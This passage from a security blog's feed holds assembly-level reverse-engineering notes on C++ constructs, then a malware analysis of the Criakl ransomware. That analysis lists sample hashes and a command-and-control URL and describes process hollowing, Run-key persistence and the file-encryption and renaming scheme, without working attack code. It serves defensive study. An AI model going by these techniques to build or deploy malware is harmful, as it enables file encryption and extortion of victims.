class="variable">&amp;nbsp</span>;局部静态变量的生命周期和全局变量是一致的，都是起于PE文件的编译阶段。但是作用域是不同的，局部静态变量的作用域是在&#123;&#125;之间。**也就是说局部静态变量会预先当做全局变量处理。**  <span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下代码：在Memory这个地址存在一个数据保存着局部静态变量的标志(这个地址在局部静态变量附近，以及这个地址可以保存八个静态局部变量)，在vc中通过与特定的位与特定的数(<span class="number">00000001</span>或者<span class="number">00000010</span>等)相或进行置<span class="number">1</span>操作。接着写入全局变量，这样做的好处是优化代码。</div></pre></td></tr></table></figure><p>xor eax,eax<br>mov al,[Memory]<br>and eax,1      ;al要么为1要么为0<br>test eax,eax   ;判断eax是否为0<br>jne xxxxxxx    ;如果不为0，跳转，标志这个标志位已经为1，也就是说这个数是局部静态变量<br>mov cl,[Memory];eax!=0<br>or cl,1        ;将cl特定的标志位置1，表示这个是局部静态变量<br>mov [Memory],cl<br>mov eax,[ebp+8]<br>mov [Static],eax  ;将局部静态变量写入全局变量区<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;但是他的作用域不和全局变量一致，我们利用变量名称粉碎实现分割作用域。</div><div class="line"></div><div class="line"><span class="meta">## 数组返回的危害</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;当数组作为局部变量在函数中时，如果函数调用完成，退出时，esp指针会指向函数调用之前(维持栈的平衡)，此时函数内部的数组就可能被其他数据覆盖，这就会导致数组返回的不稳定。</div><div class="line"></div><div class="line"><span class="meta">## 索引寻址和指针寻址</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;索引寻址比指针寻址来的更加直观，但是指针寻址更加灵活。索引寻址在汇编层只需要一次访存，而指针寻址需要两次访存。</div></pre></td></tr></table></figure></p><p>void a()<br>{<br>    char <em>Arr_a=NULL;<br>    char Arr_b[]=”Hello”；<br>    Arr_a=Arr_b;<br>    printf(“%c”,</em>Arr_a);<br>    printf(“%c”,Arr_b[0]);<br>}<br>//重点反汇编如下：<br>//指针寻址<br>mov eax,[ebp-4]  ;第一次访存<br>mov edx,[eax]    ;第二次访存<br>push edx<br>//索引寻址<br>mov eax,[ebp-0ch] ;第一次访存<br>push eax<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">## 数组指针与指针数组</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;指针数组，顾名思义就是相同数据类型的指针构成的集合。格式为`Type *Name [n]`。  </div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;数组指针，及时指向数组的指针变量。数组的首地址就是一个指针。数组指针格式为`Type (*Name) [n]`。对于二维数组，指针数组可以指向每行的首地址,例如:`char Arr[<span class="number">3</span>][<span class="number">10</span>]=&#123;&#123;Hello&#125;，&#123;world&#125;,&#123;hhhhh&#125;&#125;。char (*Parr)[<span class="number">10</span>]=Arr`</div><div class="line"></div><div class="line"><span class="meta">## this指针</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;this指针用于访问本类(实例)中的成员变量或者成员函数。如下代码，编译器利用ecx暂存This指针，如果要访问成员变量的时候，使用寄存器传参将将变量传递给你成员函数。这就是Thiscall</div></pre></td></tr></table></figure></p><p>class CTest<br>{<br>    int Num;<br>    public:<br>        void SetNumber(int Number)<br>        {<br>            Num=Number;<br>        }<br>}<br>void main(void)<br>{<br>    CTest Test;<br>    Test.SetNumber(5)；   //为CTest类成员变量Num赋初值<br>    printf(“%d”,Test.Num);<br>}<br>//反汇编代码main如下：<br>push 5   ;将参数5压栈<br>lea ecx [ebp-4]  ；将Test实例首地址存入ecx，This指针<br>call SetNumer;   ；调用SetNumber<br>mov eax,[ebp+8]  ;将参数传入print<br>push eax<br>psuh offset “%d”<br>call printf<br>add esp,8        ;thiscall，调用者清栈<br>//反汇编代码SetNumber(省略初始化过程)<br>mov [ebp-4],ecx    ;将this指针存入1内存<br>mov eax, [ebp-4]   ;将this指针存入eax<br>mov ecx ,[ebp+8]   ；将SetNumber第一个参数存入ecx<br>mov [eax],ecx      ；利用This指针，Num的地址为[eax+0],给Num赋值<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在成员函数访问其他成员变量的时候，默认使用的是Thiscall调用约定，如果选用stdcall的话，就不会使用ecx传递This指针，而是使用栈。</div></pre></td></tr></table></figure></p><p>mov eax,[ebp+8] ;取出This指针<br>mov ecx,[ebp+c] ;取出参数<br>mov [eax],ecx   ;赋值给eax成员变量<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">## 静态数据成员</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;静态数据成员在编译链接的时候已经产生，当程序被加载的时候，OS自动将其载入到对应的内存空间。也就是说当静态数据成员已经存在的时候，类还没有初始化。**即:静态数据成员的生存周期和类的生存周期是不一样的。**  </div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;第二点就是，静态数据变量不属于任何一个类，这就导致了静态数据变量和类之间是一对一的关系，从内存角度分析，静态数据成员和普通的数据成员不再相近(邻)的内存区域，**静态数据成员位于静态区，可以通过立即数寻址直接获取内存地址，而普通数据成员位于栈区。因为普通数据成员的地址是由实例化的类的地址确定的(具有不确定性)。**这也造成了计算类的大小时，不需要考虑静态数据成员。</div></pre></td></tr></table></figure></p><p>mov [ebp-8],1   ;普通数据成员<br>mov 4235bc,2    ;静态数据成员<br>lea ecx,[ebp-4];this指针<br>call showNumber<br>//showNumber内部<br>mov [ebp-4],ecx ;this指针<br>mov eax,[4235bc]<br>push eax        ;静态数据成员<br>mov ecx,[ebp-4] ;获取this指针<br>mov edx,[ecx]   ;通过this指针获取成员变量<br>push edx<br>push offset”%d”<br>call printf<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">## 构造函数</span></div><div class="line"></div><div class="line"><span class="meta">### 局部对象</span></div><div class="line"></div><div class="line"><span class="meta">### 堆对象</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在创建堆对象的时候，经常使用new关键字进行创建。**编译器会自行检查new的返回结果，如果申请堆空间成功则会调用构造函数**这是识别堆对象的关键。</div></pre></td></tr></table></figure></p><p>push 4   ;压入类的大小<br>call operator new   ;<br>add esp,4<br>mov [ebp-18h],eax   ;保存new的返回值<br>mov [ebp-4],0       ；保存申请堆空间的次数<br>cmp [ebp-18h],0     ；判断堆空间是否申请成功，这是识别堆对象的重点<br>je xxxx             ;申请失败<br>mov ecx,[ebp-18h]   ;将对象首地址存入ecx<br>call Cnumber:Cnumber ;调用构造函数<br>```<br>    <img src="https://i.imgur.com/Lfz0auh.png" alt=""></p><h3 id="参数对象"><a href="#参数对象" class="headerlink" title="参数对象"></a>参数对象</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当一个对象当做函数的参数进行传递的时候，参数对象就会发生复制，也就是说相当于拷贝了一个参数对象的副本。因此会触发拷贝构造函数。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果没有构造拷贝构造函数，编译器就会使用默认的拷贝构造函数。这种方式属于<strong>浅拷贝方式。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在特殊情况下，使用默认拷贝构造函数可能会出错，应该自行构造拷贝构造函数，这种方式称为<strong>深拷贝。</strong><br>    <img src="https://i.imgur.com/O4yT4Uc.png" alt=""><br>    <img src="https://i.imgur.com/qoDhJte.png" alt=""><br>    <img src="https://i.imgur.com/yrpbC9Y.png" alt=""></p><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我们需要清理不用的内存的时候，首先需要使用析构代理函数间接调用析构函数。因为需要释放的对象不只一个，如果直接调用析构函数，可能无法实现多对象的释放。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;引用反汇编&quot;&gt;&lt;a href=&quot;#引用反汇编&quot; class=&quot;headerlink&quot; title=&quot;引用反汇编&quot;&gt;&lt;/a&gt;引用反汇编&lt;/h2&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术18) ---Criakl勒索病毒</title>
    <link href="http://yoursite.com/2019/01/13/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_18_Criakl%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2019/01/13/病毒分析技术_18_Criakl勒索病毒/</id>
    <published>2019-01-13T03:02:11.000Z</published>
    <updated>2019-01-14T11:40:35.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;病毒分析很心酸，真的会秃头。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个是关于Criakl勒索病毒安全预警：<a href="https://baijiahao.baidu.com/s?id=1621544930994823264&amp;wfr=spider&amp;for=pc" target="_blank" rel="external">https://baijiahao.baidu.com/s?id=1621544930994823264&amp;wfr=spider&amp;for=pc</a>感谢这些安全专家吧，唉。不说了。头发真的都掉完了~~~</p><h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.目录</li><li>2.Ioc</li><li>3.行为分析</li><li>4.样本分析</li><li>5.技术总结<a id="more"></a></li></ul><h1 id="二：IoC"><a href="#二：IoC" class="headerlink" title="二：IoC"></a>二：IoC</h1><h2 id="2-1-母文件"><a href="#2-1-母文件" class="headerlink" title="2.1 母文件"></a>2.1 母文件</h2><ul><li>1.样本名称：ab82cb53a9c89f2e808288957be88b38.vir</li><li>2.样本md5：ab82cb53a9c89f2e808288957be88b38</li><li>3.是否加壳：UPX</li><li>4.编译语言：vc++</li><li>5.样本来源：来自于网络收集</li></ul><h2 id="2-2-子文件"><a href="#2-2-子文件" class="headerlink" title="2.2 子文件"></a>2.2 子文件</h2><ul><li>1.样本名称:3bd50eabb01b9561afa046b34729b104.vir</li><li>2.样本md5：3bd50eabb01b9561afa046b34729b104</li><li>3.是否加壳：无</li><li>4.编译语言：Borland Delphi(2.0-7.0)</li><li>5.样本来源:母文件中释放而来</li></ul><h2 id="2-3-url"><a href="#2-3-url" class="headerlink" title="2.3 url"></a>2.3 url</h2><ul><li><a href="http://62.210.137.204/1/inst.php" target="_blank" rel="external">http://62.210.137.204/1/inst.php</a></li></ul><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><ul><li>行为分析：<br>  <img src="https://i.imgur.com/tQXZIYJ.png" alt=""></li></ul><h1 id="四：样本分析"><a href="#四：样本分析" class="headerlink" title="四：样本分析"></a>四：样本分析</h1><h2 id="4-1-母体文件-Crikl-d"><a href="#4-1-母体文件-Crikl-d" class="headerlink" title="4.1 母体文件(Crikl.d)"></a>4.1 母体文件(Crikl.d)</h2><ul><li>加载名为ZZZZZ的资源文件，利用ResourceHack查看，可以明显看到文件被加密了。<br>  <img src="https://i.imgur.com/01CsUvx.png" alt=""><br>  <img src="https://i.imgur.com/bmmUz4t.png" alt=""></li><li>解密资源文件，解密算法不做分析，直接OD运行跑起来就好了。根据查看Hex很明显看出来这是一个可执行文件<br>  <img src="https://i.imgur.com/csw5DGW.png" alt=""></li><li>在调试过程中，发现病毒并没有采用明文的方式构建字符串，而是将字符串加密了，发现调用了几个关键的函数如下，可以知道Criakl使用了较为常见的傀儡进程的技术：<ul><li>ZwUnmapViewOfSection：解除文件映射关系</li><li>VirtualAllocEx：分配内存空间</li><li>WriteProcessMemory：写进程内存</li><li>SetThreadContext：设置进(线)程上下文</li><li>ResumeThread：唤起主线程<br><img src="https://i.imgur.com/bkKmhvN.png" alt=""><br><img src="https://i.imgur.com/Bu4Y0SJ.png" alt=""></li></ul></li><li>根据PE结构修复PE节区表：不然进程是跑不起来的。如下也符合Delphi程序的节区表特性<br>  <img src="https://i.imgur.com/OF7r1KM.png" alt=""><br>  <img src="https://i.imgur.com/egjgxpx.png" alt=""></li><li>接下来，我们已经得到了PE数据了，我们需要做的是将恶意代码dump下来。如图：可以发现这是一个伪装成压缩包的恶意程序，但是这个程序dump出来是有问题的。<br>  <img src="https://i.imgur.com/Vi09YKi.png" alt=""><br>  <img src="https://i.imgur.com/Km34kvq.png" alt=""></li><li>但是这个程序是可以运行的，根据追踪，发现他在temp目录下释放了一个ycvA文件，而且发现这个文件是一个PE文件。并且执行的流程都和我们dump出来的一样。我们有理由怀疑这个是同一个文件。<br>  <img src="https://i.imgur.com/PA1SPnF.png" alt=""><br>  <img src="https://i.imgur.com/fEqi29P.png" alt=""><br>  <img src="https://i.imgur.com/NQ5VTS3.png" alt=""></li><li>巧合的是：我得到两份Criakl病毒样本，一份是变种a，一份是变种d，其中释放出来的恶意（同dump出来的文件），和变种a的MD5是一样的。可以知道病毒作者在变种a的基础上加了一层保护，形成的变种d。<br>  <img src="https://i.imgur.com/NYfHAeU.png" alt=""></li></ul><h2 id="4-2-子文件-Criakl-a"><a href="#4-2-子文件-Criakl-a" class="headerlink" title="4.2 子文件(Criakl.a)"></a>4.2 子文件(Criakl.a)</h2><h3 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>以下是第一种情况：不是由变种d创建的进程引发的。</strong></p><ul><li>第一步：Dephi程序，直接定位到关键函数<br>   <img src="https://i.imgur.com/nEpFugK.png" alt=""></li><li>第二歩：利用Iswow64函数判断当前计算机的位数，如果是32位机器，构造Program Files<br>   <img src="https://i.imgur.com/TXO1KTN.png" alt=""></li><li>第三步：构造c://Program Files//Rarlab目录<br>   <img src="https://i.imgur.com/nSmksKj.png" alt=""></li><li>第四步：检查进程的默认SID，这一步的目的是为了判断本进程是否由Criakl.d创建的进程。<br>   <img src="https://i.imgur.com/eqhmP9N.png" alt=""></li><li>第五步：如果C://Program Files//RarLab目录不存在，创建该目录，用于存放是否的恶意文件<br>   <img src="https://i.imgur.com/7AsNxDY.png" alt=""></li><li>第六步：判断当前执行的文件是否有RarLab目录下释放的恶意文件执行的。<br>   <img src="https://i.imgur.com/mP3AVoM.png" alt=""></li><li>第七步：如果不是从RarLab下执行的恶意代码，则将当前执行的恶意样本写一份，释放到RarLab目录下<br>   <img src="https://i.imgur.com/uvlnUSS.png" alt=""><br>   <img src="https://i.imgur.com/08hTlnS.png" alt=""></li><li>第八步：将释放的文件的时间修改为和svchost.exe一样，目的还是为了迷惑受害者。<br>  <img src="https://i.imgur.com/lZPYRfK.png" alt=""><br>  <img src="https://i.imgur.com/txjbeSf.png" alt=""></li><li>第九步：最后执行C:\Program Files\RarLab\yvcA.vir文件</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>以下是第二种情形：不是由变种d创建的进程引发，但是创建进程的文件目录是在RarLab下</strong></p><ul><li>判断是否带有参数install以及计算机的位数，然后设置注册表run键，最后执行感染流程。但是这里作者是通过0号参数是文件名写入run键下的，但是作者没有对获取的文件名做验证，导致如图获取的文件名是位于桌面的分析样本，实际中，应该是位于RarLab目录下的样本。<br>  <img src="https://i.imgur.com/PJfrcHz.png" alt=""><br>  <img src="https://i.imgur.com/Zwne2Nr.png" alt=""><br>  <img src="https://i.imgur.com/hY5zlR7.png" alt=""></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>以下是第三种情况：是由变种d创建的进程引发的。</strong></p><ul><li>第一步：判断当前进程是否是在C:\DOCUME~1\hacky\LOCALS~1\Temp\RarLab目录下，如果是则执行感染机制，否则创建该目录，用来释放恶意文件。<br>  <img src="https://i.imgur.com/qqO8tyh.png" alt=""><br>  <img src="https://i.imgur.com/FQ7HoPc.png" alt=""></li><li>第二歩：和第一种情况相同，修改文件访问时间，并且创建新的进程。然后退出本进程<br>  <img src="https://i.imgur.com/zDQmzHp.png" alt=""><br>  <img src="https://i.imgur.com/Z1YYtRd.png" alt=""></li></ul><h2 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h2><ul><li><p>判断C:\Program Files\RarLab\winrar.tmp文件是否存在<br>  <img src="https://i.imgur.com/gcd9flk.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>如果winrar.tmp文件存在</strong></p></li><li><p>第一步：读取winrar.tmp里面的数据。然后创建d.bat<br>  <img src="https://i.imgur.com/hn43hSk.png" alt=""></p></li><li>第二步：之后的这个判断永远为假，对其交叉引用发现只有使用，没有修改部分，也就是说这个变量是一个常量字符串。两个比较必为假。不知道作者这步的意义是什么？【存疑】<br>  <img src="https://i.imgur.com/15anb6a.png" alt=""><br>  <img src="https://i.imgur.com/AVRWUD4.png" alt=""></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>如果winrar.tmp文件不存在</strong></p><ul><li><p>第一步：生成36轮次的随机数，然后获取本地时间，这些随机数和时间用于以后修改被感染文件的文件名。格式为随机数字符串+日期+时间+随机数(字符串)，<br>  <img src="https://i.imgur.com/bpUpteM.png" alt=""><br>  <img src="https://i.imgur.com/hLYLJ3c.png" alt=""><br>  <img src="https://i.imgur.com/H6fXxR2.png" alt=""><br>  <img src="https://i.imgur.com/MCpns6A.png" alt=""></p></li><li><p>第二歩：然后经过9层加密后得到字符串，这个字符串是形成加密文件的名称的组成部分以及后期加密用的数据元<br>  <img src="https://i.imgur.com/nskw7KT.png" alt=""><br>  <img src="https://i.imgur.com/otLObqZ.png" alt=""></p></li><li>第三步：以Post提交请求，但是这个网站现在已经访问不了了,应该执行CC服务器的职责。<br>  <img src="https://i.imgur.com/0ltVkqW.png" alt=""><br>  <img src="https://i.imgur.com/eHt4DCc.png" alt=""></li><li>第三步：创建RarLab/winrar.zip,内容是之前的数据数据+这次产生的随机数据<br>  <img src="https://i.imgur.com/Cr8OHI4.png" alt=""></li><li>第四步：获取本地磁盘盘符信息，然后进行26次循环，遍历和加密文件<br>  <img src="https://i.imgur.com/lF3BeQf.png" alt=""></li><li>第五步：创建d.bat,用于删除所有的<em>.dat和</em>.exe文件，以及做本地回环测试<br>  <img src="https://i.imgur.com/ZYM488z.png" alt=""><br>  <img src="https://i.imgur.com/G67lBLf.png" alt=""><br>  <img src="https://i.imgur.com/sZplIEq.png" alt=""></li></ul><h2 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整个加密流程，差不多分析了两天，里面的工程量异常巨大，频繁调用了相同的结构，但是这些结构都是采用了随机数进行加密，不清楚作者的真实意图是什么，经过分析了部分加密样本的形式，可能存在以下特征(这只是我的个人猜测)：对于较小的文件，采用填充随机字段+附加数据的方式加密文件，对于大文件，直接附加数据的方式加密。</p><ul><li>首先对于x://windows目录不进行加密<br>  <img src="https://i.imgur.com/PDPWHrM.png" alt=""></li><li>先读取文件的内容，读取完毕后，在判断文件末尾是否存在{CRYPTENDBLACKDC}字段<br>  <img src="https://i.imgur.com/py4O27d.png" alt=""></li><li>进行了40轮次数据加密，由于程序使用了Randomize()，造成了加密的数据很大程度是随机的。<br>  <img src="https://i.imgur.com/DKtDPfW.png" alt=""><br>  <img src="https://i.imgur.com/u5dAmvm.png" alt=""><br>   <img src="https://i.imgur.com/t25BXX3.png" alt=""></li><li>对于大文件来说，Criakl直接附加额外的数据，一般是通过GetPostion函数获取的设备相对位置和被加密文件的MD5值，并写入文件的末尾。<br>  <img src="https://i.imgur.com/cXIpSe8.png" alt=""><br>  <img src="https://i.imgur.com/TVwqRaF.png" alt=""><br>  <img src="https://i.imgur.com/fyoFb8i.png" alt=""></li><li>接下来将一些数字写入，这些数据分别代表的参数由<code>ReOpenBuff.cBytes</code>,<code>ReOpenBuff.szPathName</code>，<code>ReOpenBuff.szPathName[32]</code>等等。</li><li>然后写入一个通过两次设备相对位置获取的一个字符串32位字符串<br>  <img src="https://i.imgur.com/3YlL4Gw.png" alt=""></li><li>然后附加一个随机字符+时间+随机字符的机器ID，以及文件名和结束的感染标志<br>  <img src="https://i.imgur.com/TcK6UEy.png" alt=""></li><li>最后修改被感染文件名：filename+id-{id}-email-email@gmail.com-ver-4.0.0.0.cbf</li></ul><h1 id="五：技术总结"><a href="#五：技术总结" class="headerlink" title="五：技术总结"></a>五：技术总结</h1><h2 id="5-1-Delphi程序逆向"><a href="#5-1-Delphi程序逆向" class="headerlink" title="5.1 Delphi程序逆向"></a>5.1 Delphi程序逆向</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先逆Delphi程序有一个神器：Delphi_Decompiler，而delphi编译出来的PE文件可能会有CODE，DATA，BSS，.IDAta，tls，.rdata，.rsrc这些段。.rsrc段比较重要，这里除了一般的资源以外，还有工程信息和DFM资源信息，这一节开始部分是常规的资源表。Delphi程序(exe)常见的入口点如下,InitExe会从.rsrc读取出资源里的drm，然后调用StartExe来从InitRoutineTable读取所有的FunTable，挨个执行对应的Routine。CreateForm创建Form是整个程序初始化的主要流程：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">delphi exe入口:</div><div class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0FFFFFFF4h</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, offset InitRoutineTable</div><div class="line"><span class="keyword">call</span>    @@InitExe//</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:off_442C20</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</div><div class="line"><span class="keyword">call</span>    unknown_libname_291</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ds</span>:off_442AB4</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:off_442C20</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, off_441498</div><div class="line"><span class="keyword">call</span>    @TApplication@CreateForm </div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:off_442C20</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</div><div class="line"><span class="keyword">call</span>    @TApplication@Run </div><div class="line"><span class="keyword">call</span>    @@Halt0</div></pre></td></tr></table></figure></p><pre><code>![](https://i.imgur.com/teeomOk.png)</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何定位？很简单的。先用Delphi_Decompiler查看Form，一旦找到Form，直接在IDA里面跟就能找到具体的函数，最后OD下断点即可！<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dephi采用的是Fast函数调用方式，也就是说前面3个参数用寄存器EAX,EDX,ECX保存，剩下的参数利用栈保存，返回值返回的是指针而非数据，这就需要逆向分析时先用OD转到Hex窗口，在用里面的地址值去查看具体的数据。</p><ul><li>参考自：<a href="https://www.52pojie.cn/thread-141040-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-141040-1-1.html</a><h2 id="5-2-加密过程定位"><a href="#5-2-加密过程定位" class="headerlink" title="5.2 加密过程定位"></a>5.2 加密过程定位</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整个分析过程中关于加密过程所浪费的时间占了60%的时间。但是也没有分析出什么特别有效的东西(写不出解密工具)，把我这几天的小小体会分享一下。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一拿到函数流程，很dan疼，可以看到流程异常复杂，之前的勒索病毒都是利用windows提供的CSP加密，所以加密流程不是很复杂(比这个明了)。全篇2600的代码量也是非常大的了，那么如何去分析呢？？<br>  <img src="https://i.imgur.com/9AQNH5Z.png" alt=""><br>  <img src="https://i.imgur.com/ociWiUE.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我的做法是先找入口FirstFile，出口FindClose，中间过程FindNNext。确定了三个点，之后只需要在循环里面进行就好了。然后就是调试了。  